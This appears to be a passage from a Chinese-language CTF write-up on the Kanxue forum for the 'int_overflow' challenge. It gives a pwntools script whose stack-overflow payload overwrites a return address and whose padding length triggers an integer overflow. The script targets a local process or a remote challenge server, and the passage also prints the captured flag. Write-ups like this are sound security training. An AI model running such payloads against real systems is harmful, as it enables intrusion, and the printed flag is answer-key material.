
```python
from pwn import *
context(os='linux',arch='x86',log_level="debug") #arch的参数为：'x86'、'amd64'
content = 1

def main():
    if content == 1:
        sh = process("int_overflow") #打本地
    else:
        sh = remote("111.200.241.244", 57990) #打远程

    payload = b'A' * (0x14 + 4) + p32(0x804868B) + b'A' * 234
    sh.sendlineafter("Your choice:", '1')
    sh.sendlineafter("Please input your username:\n", "hahaha")
    sh.sendlineafter("Please input your passwd:\n", payload)
    sh.interactive()

if __name__ == '__main__':
    main()
```

这里补充一个python的知识点：`ljust()`方法

用于返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。

这里的`payload`还可以这么写：

```python
payload = b'A' * (0x14 + 4) + p32(0x804868B)
payload = payload.ljust(234,'A')
```

![](https://bbs.kanxue.com/upload/attach/202204/920613_QR2JJYEJK2KXCQZ.png)

`cyberpeace{2045fa7e3286f5b911ed7f0515ede0ad}`

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [`6-int_overflow`](javascript:void(0);)

  （7.73kb，17次下载）
